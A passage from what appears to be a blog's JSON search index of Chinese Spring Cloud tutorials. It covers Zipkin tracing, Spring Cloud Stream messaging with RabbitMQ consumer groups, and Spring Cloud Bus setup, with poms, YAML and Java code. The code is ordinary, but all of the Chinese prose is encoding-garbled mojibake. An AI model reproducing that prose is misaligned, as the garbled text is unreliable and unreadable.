#æ˜¯å¦ä»EurekaServeræŠ“å–å·²æœ‰çš„æ³¨å†Œä¿¡æ¯ï¼Œé»˜è®¤ä¸ºtrueã€‚å•èŠ‚ç‚¹æ— æ‰€è°“ï¼Œé›†ç¾¤å¿…é¡»è®¾ç½®ä¸ºtrueæ‰èƒ½é…åˆribbonä½¿ç”¨è´Ÿè½½å‡è¡¡ fetchRegistry: true service-url: #å•æœº #defaultZone: http://localhost:7001/eureka # é›†ç¾¤ defaultZone: http://eureka7001.com:7001/eureka,http://eureka7002.com:7002/eureka # é›†ç¾¤ç‰ˆ ä¸šåŠ¡ç±»OrderController // ====================&gt; zipkin+sleuth @GetMapping(&quot;/consumer/payment/zipkin&quot;) public String paymentZipkin() { String result = restTemplate.getForObject(&quot;http://localhost:8001&quot;+&quot;/payment/zipkin/&quot;, String.class); return result; } ä¾æ¬¡å¯åŠ¨eureka7001/8001/8080è°ƒç”¨8001å‡ æ¬¡æµ‹è¯•ä¸‹ http://localhost/consumer/payment/zipkin æ‰“å¼€æµè§ˆå™¨è®¿é—®:http:localhost:9411ä¼šå‡ºç°ä»¥ä¸‹ç•Œé¢ 1597835524811 æŸ¥çœ‹ 1597835538196 æŸ¥çœ‹ä¾èµ–å…³ç³» åŸç† 1597835568713","categories":[{"name":"åˆ†å¸ƒå¼","slug":"åˆ†å¸ƒå¼","permalink":"https://blog.kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://blog.kayleh.top/tags/DistributedMicroservices/"}]},{"title":"SpringCloud Streamæ¶ˆæ¯é©±åŠ¨","slug":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„7","date":"2020-08-14T07:33:07.000Z","updated":"2021-04-11T17:11:28.737Z","comments":true,"path":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„7/","link":"","permalink":"https://blog.kayleh.top/%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%847/","excerpt":"SpringCloud Streamæ¶ˆæ¯é©±åŠ¨","text":"SpringCloud Streamæ¶ˆæ¯é©±åŠ¨ æ¶ˆæ¯é©±åŠ¨æ¦‚è¿°å±è”½åº•å±‚æ¶ˆæ¯ä¸­é—´ä»¶çš„å·®å¼‚ï¼Œé™ä½åˆ‡æ¢ç‰ˆæœ¬ï¼Œç»Ÿä¸€æ¶ˆæ¯çš„ç¼–ç¨‹æ¨¡å‹ 1597388512890 1597388531508 Spring Cloud Streamä¸­æ–‡æŒ‡å¯¼æ‰‹å†Œ https://m.wang1314.com/doc/webapp/topic/20971999.html è®¾è®¡æ€æƒ³æ ‡å‡†MQ1597828873174 ç”Ÿäº§è€…/æ¶ˆè´¹è€…ä¹‹é—´é æ¶ˆæ¯åª’ä»‹ä¼ é€’ä¿¡æ¯å†…å®¹:\\ Message æ¶ˆæ¯å¿…é¡»èµ°ç‰¹å®šçš„é€šé“ æ¶ˆæ¯é€šé“MessageChannel æ¶ˆæ¯é€šé“é‡Œçš„æ¶ˆæ¯å¦‚ä½•è¢«æ¶ˆè´¹å‘¢ï¼Œè°è´Ÿè´£æ”¶å‘å¤„ç†: æ¶ˆæ¯é€šé“MessageChannelçš„å­æ¥å£SubscribableChannel,ç”±MessageHandleræ¶ˆæ¯å¤„ç†å™¨è®¢é˜… ä¸ºä»€ä¹ˆç”¨Cloud Stream1598076856767 1598076876160 1598076887339 streamå‡­ä»€ä¹ˆå¯ä»¥ç»Ÿä¸€åº•å±‚å·®å¼‚ 1597828959376 1597828966885 Binder 1597828986684 1597828994579 1597829004031 INPUTå¯¹åº”äºæ¶ˆè´¹è€… OUTPUTå¯¹åº”äºç”Ÿäº§è€… Streamä¸­çš„æ¶ˆæ¯é€šä¿¡æ–¹å¼éµå¾ªäº†å‘å¸ƒ-è®¢é˜…æ¨¡å¼Topicä¸»é¢˜è¿›è¡Œå¹¿æ’­ åœ¨RabbitMQå°±æ˜¯Exchange åœ¨kafkaä¸­å°±æ˜¯Topic Spring Cloud Streamæ ‡å‡†æµç¨‹å¥—è·¯1597829077773 1597829087752 Binder å¾ˆæ–¹ä¾¿çš„è¿æ¥ä¸­é—´ä»¶ï¼Œå±è”½å·®å¼‚ Channel é€šé“ï¼Œæ˜¯é˜Ÿåˆ—Queueçš„ä¸€ç§æŠ½è±¡ï¼Œåœ¨æ¶ˆæ¯é€šè®¯ç³»ç»Ÿä¸­å°±æ˜¯å®ç°å­˜å‚¨å’Œè½¬å‘çš„åª’ä»‹ï¼Œé€šè¿‡å¯¹Channelå¯¹é˜Ÿåˆ—è¿›è¡Œé…ç½® Sourceå’ŒSink ç®€å•çš„å¯ç†è§£ä¸ºå‚ç…§å¯¹è±¡æ˜¯Spring Cloud Streamè‡ªèº«ï¼Œä»Streamå‘å¸ƒæ¶ˆæ¯å°±æ˜¯è¾“å‡ºï¼Œæ¥å—æ¶ˆæ¯å°±æ˜¯è¾“å…¥ ç¼–ç APIå’Œå¸¸ç”¨æ³¨è§£1597829175675 æ¡ˆä¾‹è¯´æ˜RabbitMQç¯å¢ƒå·²ç»OK å·¥ç¨‹ä¸­æ–°å»ºä¸‰ä¸ªå­æ¨¡å— cloud-stream-rabbitmq-provider8801,ä½œä¸ºç”Ÿäº§è€…è¿›è¡Œå‘æ¶ˆæ¯æ¨¡å— cloud-stream-rabbitmq-consumer8802,ä½œä¸ºæ¶ˆæ¯æ¥æ”¶æ¨¡å— cloud-stream-rabbitmq-consumer8803,ä½œä¸ºæ¶ˆæ¯æ¥æ”¶æ¨¡å— æ¶ˆæ¯é©±åŠ¨ä¹‹ç”Ÿäº§è€…æ–°å»ºModule cloud-stream-rabbitmq-provider8801 pom &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-stream-rabbit&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-starter-eureka-server --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-devtools --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.projectlombok/lombok --&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-test --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; yaml server: port: 8801 spring: application: name: cloud-stream-provider cloud: stream: binders: # åœ¨æ­¤å¤„é…ç½®è¦ç»‘å®šçš„rabbitmqçš„æœåŠ¡ä¿¡æ¯ï¼› defaultRabbit: # è¡¨ç¤ºå®šä¹‰çš„åç§°ï¼Œç”¨äºäºbindingæ•´åˆ type: rabbit # æ¶ˆæ¯ç»„ä»¶ç±»å‹ environment: # è®¾ç½®rabbitmqçš„ç›¸å…³çš„ç¯å¢ƒé…ç½® spring: rabbitmq: host: localhost port: 5672 username: guest password: guest bindings: # æœåŠ¡çš„æ•´åˆå¤„ç† output: # è¿™ä¸ªåå­—æ˜¯ä¸€ä¸ªé€šé“çš„åç§° destination: studyExchange # è¡¨ç¤ºè¦ä½¿ç”¨çš„Exchangeåç§°å®šä¹‰ content-type: application/json # è®¾ç½®æ¶ˆæ¯ç±»å‹ï¼Œæœ¬æ¬¡ä¸ºjsonï¼Œæ–‡æœ¬åˆ™è®¾ç½®â€œtext/plainâ€ binder: defaultRabbit # è®¾ç½®è¦ç»‘å®šçš„æ¶ˆæ¯æœåŠ¡çš„å…·ä½“è®¾ç½® eureka: client: # å®¢æˆ·ç«¯è¿›è¡ŒEurekaæ³¨å†Œçš„é…ç½® service-url: defaultZone: http://localhost:7001/eureka instance: lease-renewal-interval-in-seconds: 2 # è®¾ç½®å¿ƒè·³çš„æ—¶é—´é—´éš”ï¼ˆé»˜è®¤æ˜¯30ç§’ï¼‰ lease-expiration-duration-in-seconds: 5 # å¦‚æœç°åœ¨è¶…è¿‡äº†5ç§’çš„é—´éš”ï¼ˆé»˜è®¤æ˜¯90ç§’ï¼‰ instance-id: send-8801.com # åœ¨ä¿¡æ¯åˆ—è¡¨æ—¶æ˜¾ç¤ºä¸»æœºåç§° prefer-ip-address: true # è®¿é—®çš„è·¯å¾„å˜ä¸ºIPåœ°å€ ä¸»å¯åŠ¨ç±»StreamMQMain8801 package com.kayleh.springcloud; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; @SpringBootApplication public class StreamMQMain8801 { public static void main(String[] args) { SpringApplication.run(StreamMQMain8801.class, args); } } ä¸šåŠ¡ç±»å‘é€æ¶ˆæ¯æ¥å£ package com.kayleh.springcloud.service; public interface IMessageProvider { public String send(); } å‘é€æ¶ˆæ¯æ¥å£å®ç°ç±» package com.kayleh.springcloud.service.impl; @EnableBinding(Source.class) //å®šä¹‰æ¶ˆæ¯çš„æ¨é€ç®¡é“ public class MessageProviderImpl implements IMessageProvider { @Resource private MessageChannel output; // æ¶ˆæ¯å‘é€ç®¡é“ @Override public String send() { String serial = UUID.randomUUID().toString(); output.send(MessageBuilder.withPayload(serial).build()); System.out.println(&quot;*****serial: &quot;+serial); return null; } } Controller package com.kayleh.springcloud.controller; import com.kayleh.springcloud.service.IMessageProvider; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; import javax.annotation.Resource; @RestController public class SendMessageController { @Resource private IMessageProvider messageProvider; @GetMapping(value = &quot;/sendMessage&quot;) public String sendMessage() { return messageProvider.send(); } } æµ‹è¯• å¯åŠ¨7001eureka å¯åŠ¨rabbitmq: rabbitmq-plugins enable rabbitmq_management http://localhost:15672/ å¯åŠ¨8801 è®¿é—®http://localhost:8801/sendMessage æ¶ˆæ¯é©±åŠ¨ä¹‹æ¶ˆè´¹è€…æ–°å»ºModule cloud-stream-rabbitmq-consumer8802 pom &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-stream-rabbit&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-starter-eureka-server --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-devtools --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.projectlombok/lombok --&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-test --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; yml server: port: 8802 spring: application: name: cloud-stream-consumer cloud: stream: binders: # åœ¨æ­¤å¤„é…ç½®è¦ç»‘å®šçš„rabbitmqçš„æœåŠ¡ä¿¡æ¯ï¼› defaultRabbit: # è¡¨ç¤ºå®šä¹‰çš„åç§°ï¼Œç”¨äºäºbindingæ•´åˆ type: rabbit # æ¶ˆæ¯ç»„ä»¶ç±»å‹ environment: # è®¾ç½®rabbitmqçš„ç›¸å…³çš„ç¯å¢ƒé…ç½® spring: rabbitmq: host: localhost port: 5672 username: guest password: guest bindings: # æœåŠ¡çš„æ•´åˆå¤„ç† input: # è¿™ä¸ªåå­—æ˜¯ä¸€ä¸ªé€šé“çš„åç§° destination: studyExchange # è¡¨ç¤ºè¦ä½¿ç”¨çš„Exchangeåç§°å®šä¹‰ content-type: application/json # è®¾ç½®æ¶ˆæ¯ç±»å‹ï¼Œæœ¬æ¬¡ä¸ºjsonï¼Œæ–‡æœ¬åˆ™è®¾ç½®â€œtext/plainâ€ binder: defaultRabbit # è®¾ç½®è¦ç»‘å®šçš„æ¶ˆæ¯æœåŠ¡çš„å…·ä½“è®¾ç½® eureka: client: # å®¢æˆ·ç«¯è¿›è¡ŒEurekaæ³¨å†Œçš„é…ç½® service-url: defaultZone: http://localhost:7001/eureka instance: lease-renewal-interval-in-seconds: 2 # è®¾ç½®å¿ƒè·³çš„æ—¶é—´é—´éš”ï¼ˆé»˜è®¤æ˜¯30ç§’ï¼‰ lease-expiration-duration-in-seconds: 5 # å¦‚æœç°åœ¨è¶…è¿‡äº†5ç§’çš„é—´éš”ï¼ˆé»˜è®¤æ˜¯90ç§’ï¼‰ instance-id: receive-8802.com # åœ¨ä¿¡æ¯åˆ—è¡¨æ—¶æ˜¾ç¤ºä¸»æœºåç§° prefer-ip-address: true # è®¿é—®çš„è·¯å¾„å˜ä¸ºIPåœ°å€ ä¸»å¯åŠ¨ç±»StreamMQMain8802 package com.kayleh.springcloud; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; @SpringBootApplication public class StreamMQMain8802 { public static void main(String[] args) { SpringApplication.run(StreamMQMain8802.class, args); } } controller package com.kayleh.springcloud.controller; import org.springframework.cloud.stream.annotation.StreamListener; import org.springframework.messaging.Message; import org.springframework.beans.factory.annotation.Value; import org.springframework.cloud.stream.annotation.EnableBinding; import org.springframework.cloud.stream.messaging.Sink; import org.springframework.stereotype.Component; @Component @EnableBinding(Sink.class) public class ReceiveMessageListenerController { @Value(&quot;${server.port}&quot;) private String serverPort; @StreamListener(Sink.INPUT) public void input(Message&lt;String&gt; message) { System.out.println(&quot;æ¶ˆè´¹è€…1å·ï¼Œæ¥å—ï¼š&quot;+message.getPayload()+&quot;\\t port:&quot;+serverPort); } } æµ‹è¯•8801å‘é€8802æ¥æ”¶æ¶ˆæ¯ http://localhost:8801/sendMessage åˆ†ç»„æ¶ˆè´¹ä¸æŒä¹…åŒ–ä¾ç…§8802ï¼Œcloneå‡ºæ¥ä¸€ä»½è¿è¡Œ8803cloud-stream-rabbitmq-consumer8803 pom &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-stream-rabbit&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--åŸºç¡€é…ç½®--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; yaml server: port: 8803 spring: application: name: cloud-stream-consumer cloud: stream: binders: # åœ¨æ­¤å¤„é…ç½®è¦ç»‘å®šçš„rabbitmqçš„æœåŠ¡ä¿¡æ¯ï¼› defaultRabbit: # è¡¨ç¤ºå®šä¹‰çš„åç§°ï¼Œç”¨äºäºbindingæ•´åˆ type: rabbit # æ¶ˆæ¯ç»„ä»¶ç±»å‹ environment: # è®¾ç½®rabbitmqçš„ç›¸å…³çš„ç¯å¢ƒé…ç½® spring: rabbitmq: host: localhost port: 5672 username: guest password: guest bindings: # æœåŠ¡çš„æ•´åˆå¤„ç† input: # è¿™ä¸ªåå­—æ˜¯ä¸€ä¸ªé€šé“çš„åç§° destination: studyExchange # è¡¨ç¤ºè¦ä½¿ç”¨çš„Exchangeåç§°å®šä¹‰ content-type: application/json # è®¾ç½®æ¶ˆæ¯ç±»å‹ï¼Œæœ¬æ¬¡ä¸ºå¯¹è±¡jsonï¼Œå¦‚æœæ˜¯æ–‡æœ¬åˆ™è®¾ç½®â€œtext/plainâ€ binder: defaultRabbit # è®¾ç½®è¦ç»‘å®šçš„æ¶ˆæ¯æœåŠ¡çš„å…·ä½“è®¾ç½® group: kaylehA eureka: client: # å®¢æˆ·ç«¯è¿›è¡ŒEurekaæ³¨å†Œçš„é…ç½® service-url: defaultZone: http://localhost:7001/eureka instance: lease-renewal-interval-in-seconds: 2 # è®¾ç½®å¿ƒè·³çš„æ—¶é—´é—´éš”ï¼ˆé»˜è®¤æ˜¯30ç§’ï¼‰ lease-expiration-duration-in-seconds: 5 # å¦‚æœç°åœ¨è¶…è¿‡äº†5ç§’çš„é—´éš”ï¼ˆé»˜è®¤æ˜¯90ç§’ï¼‰ instance-id: receive-8803.com # åœ¨ä¿¡æ¯åˆ—è¡¨æ—¶æ˜¾ç¤ºä¸»æœºåç§° prefer-ip-address: true # è®¿é—®çš„è·¯å¾„å˜ä¸ºIPåœ°å€ ä¸»å¯åŠ¨ç±» package com.kayleh.springcloud; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; @SpringBootApplication public class StreamMQMain8803 { public static void main(String[] args) { SpringApplication.run(StreamMQMain8803.class,args); } } ä¸šåŠ¡ç±» package com.kayleh.springcloud.controller; import org.springframework.beans.factory.annotation.Value; import org.springframework.cloud.stream.annotation.EnableBinding; import org.springframework.cloud.stream.annotation.StreamListener; import org.springframework.cloud.stream.messaging.Sink; import org.springframework.messaging.Message; import org.springframework.stereotype.Component; @Component @EnableBinding(Sink.class) public class ReceiveMessageListenerController { @Value(&quot;${server.port}&quot;) private String serverPort; @StreamListener(Sink.INPUT) public void input(Message&lt;String&gt; message) { System.out.println(&quot;æ¶ˆè´¹è€…2å·,-----&gt;æ¥å—åˆ°çš„æ¶ˆæ¯: &quot;+message.getPayload()+&quot;\\t port: &quot;+serverPort); } } å¯åŠ¨ 7001æœåŠ¡æ³¨å†Œ 8801æ¶ˆæ¯ç”Ÿäº§ 8802æ¶ˆæ¯æ¶ˆè´¹ 8803æ¶ˆæ¯æ¶ˆè´¹ è¿è¡Œåä¸¤ä¸ªé—®é¢˜ æœ‰é‡å¤æ¶ˆè´¹é—®é¢˜ æ¶ˆæ¯æŒä¹…åŒ–é—®é¢˜ æ¶ˆè´¹ ç›®å‰æ˜¯8802/8803åŒæ—¶éƒ½æ”¶åˆ°äº†ï¼Œå­˜åœ¨é‡å¤æ¶ˆè´¹é—®é¢˜ http://localhost:8801/sendMessage å¦‚ä½•è§£å†³? åˆ†ç»„å’ŒæŒä¹…åŒ–å±æ€§group é‡è¦ ç”Ÿäº§å®é™…æ¡ˆä¾‹ 1597830160806 1597830172304 åˆ†ç»„ åŸç† å¾®æœåŠ¡åº”ç”¨æ”¾ç½®äº åŒä¸€ä¸ªgroupä¸­ï¼Œå°±èƒ½å¤Ÿä¿è¯æ¶ˆæ¯åªä¼šè¢«å…¶ä¸­ä¸€ä¸ªåº”ç”¨æ¶ˆè´¹ä¸€æ¬¡ã€‚ ä¸åŒçš„ç»„æ˜¯å¯ä»¥æ¶ˆè´¹çš„ï¼ŒåŒä¸€ä¸ªç»„å†…ä¼šå‘ç”Ÿç«äº‰å…³ç³»ï¼Œåªæœ‰å…¶ä¸­ä¸€ä¸ªå¯ä»¥æ¶ˆè´¹ã€‚ 8802/8803éƒ½å˜æˆä¸åŒç»„ï¼Œgroupä¸¤ä¸ªä¸åŒ group: kaylehAã€kaylehB 8802ä¿®æ”¹YML åœ¨binderä¸‹é¢æ·»åŠ  group: kaylehA 8803ä¿®æ”¹YML group: kaylehB æˆ‘ä»¬è‡ªå·±é…ç½® 1597830340659 ç»“è®º è¿˜æ˜¯é‡å¤æ¶ˆè´¹ 8802/8803å®ç°äº†è½®è¯¢åˆ†ç»„ï¼Œæ¯æ¬¡åªæœ‰ä¸€ä¸ªæ¶ˆè´¹è€… 8801æ¨¡å—çš„å‘çš„æ¶ˆæ¯åªèƒ½è¢«8802æˆ–8803å…¶ä¸­ä¸€ä¸ªæ¥æ”¶åˆ°ï¼Œè¿™æ ·é¿å…äº†é‡å¤æ¶ˆè´¹ 8802/8803éƒ½å˜æˆç›¸åŒç»„ï¼Œgroupä¸¤ä¸ªç›¸åŒ group: kaylehA 8802ä¿®æ”¹YML group: kaylehA 8803ä¿®æ”¹YML group: kaylehA ç»“è®º åŒä¸€ä¸ªç»„çš„å¤šä¸ªå¾®æœåŠ¡å®ä¾‹ï¼Œæ¯æ¬¡åªä¼šæœ‰ä¸€ä¸ªæ‹¿åˆ° æŒä¹…åŒ–é€šè¿‡ä¸Šè¿°ï¼Œè§£å†³äº†é‡å¤æ¶ˆè´¹é—®é¢˜ï¼Œå†çœ‹çœ‹æŒä¹…åŒ– åœæ­¢8802/8803å¹¶å»é™¤æ‰8802çš„åˆ†ç»„group:kaylehA 8803çš„åˆ†ç»„group:kaylehAæ²¡æœ‰å»æ‰ 8801å…ˆå‘é€4æ¡ä¿¡æ¯åˆ°rabbitmq å…ˆå¯åŠ¨8802ï¼Œæ— åˆ†ç»„å±æ€§é…ç½®ï¼Œåå°æ²¡æœ‰æ‰“å‡ºæ¥æ¶ˆæ¯ å…ˆå¯åŠ¨8803ï¼Œæœ‰åˆ†ç»„å±æ€§é…ç½®ï¼Œåå°æ‰“å‡ºæ¥äº†MQä¸Šçš„æ¶ˆæ¯","categories":[{"name":"åˆ†å¸ƒå¼","slug":"åˆ†å¸ƒå¼","permalink":"https://blog.kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://blog.kayleh.top/tags/DistributedMicroservices/"}]},{"title":"SpringCloud Busæ¶ˆæ¯æ€»çº¿","slug":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„6","date":"2020-08-14T07:29:28.000Z","updated":"2021-04-11T17:11:28.726Z","comments":true,"path":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„6/","link":"","permalink":"https://blog.kayleh.top/%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%846/","excerpt":"SpringCloud Bus æ¶ˆæ¯æ€»çº¿","text":"SpringCloud Bus æ¶ˆæ¯æ€»çº¿ ä¸Šä¸€è®²è§£çš„åŠ æ·±å’Œæ‰©å……ï¼Œä¸€è¨€ä»¥è”½ä¹‹ åˆ†å¸ƒå¼è‡ªåŠ¨åˆ·æ–°é…ç½®åŠŸèƒ½ Spring Cloud Busé…åˆSpring Cloud Configä½¿ç”¨å¯ä»¥å®ç°é…ç½®çš„åŠ¨æ€åˆ·æ–° æ˜¯ä»€ä¹ˆï¼Ÿ1597326106343 Busæ”¯æŒä¸¤ç§æ¶ˆæ¯ä»£ç†ï¼šRabbitMQå’ŒKafka èƒ½å¹²å˜›ï¼Ÿ1597326181455 ä¸ºä½•è¢«ç§°ä¸ºæ€»çº¿1597326216800 RabbitMQç¯å¢ƒé…ç½®å®‰è£…Erlangï¼Œä¸‹è½½åœ°å€ï¼šhttp://erlang.org/download/otp_win64_21.3.exe 1597326251762 1597326263813 å®‰è£…RabbitMQï¼Œä¸‹è½½åœ°å€ https://dl.bintray.com/rabbitmq/all/rabbitmq-server/3.7.14/rabbitmq-server-3.7.14.exe 1597326363871 è¿›å…¥RabbitMQå®‰è£…ç›®å½•ä¸‹çš„sbinç›®å½• å¦‚ä¾‹æˆ‘è‡ªå·±æœ¬æœºD:\\scmq\\rabbitmq_server-3.7.14\\sbin 1597326403266 è¾“å…¥ä»¥ä¸‹å‘½ä»¤å¯åŠ¨ç®¡ç†åŠŸèƒ½ rabbitmq-plugins enable rabbitmq_management 1597326436344 å¯è§†åŒ–æ’ä»¶ 1597326454063 è®¿é—®åœ°å€æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ http://localhost:15672/ è¾“å…¥è´¦å·å¯†ç å¹¶ç™»å½•: guest guest SpringCloud BusåŠ¨æ€åˆ·æ–°å…¨å±€å¹¿æ’­å¿…é¡»å…ˆå…·å¤‡è‰¯å¥½çš„RabbitMQç¯å¢ƒå…ˆ æ¼”ç¤ºå¹¿æ’­æ•ˆæœï¼Œå¢åŠ å¤æ‚åº¦ï¼Œå†ä»¥3355ä¸ºæ¨¡æ¿å†åˆ¶ä½œä¸€ä¸ª3366 æ–°å»ºcloud-config-client-3366 pom &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; bootstrap.yml server: port: 3366 spring: application: name: config-client cloud: config: label: master name: config profile: dev uri: http://localhost:3344 eureka: client: service-url: defaultZone: http://eureka7001.com:7001/eureka management: endpoints: web: exposure: 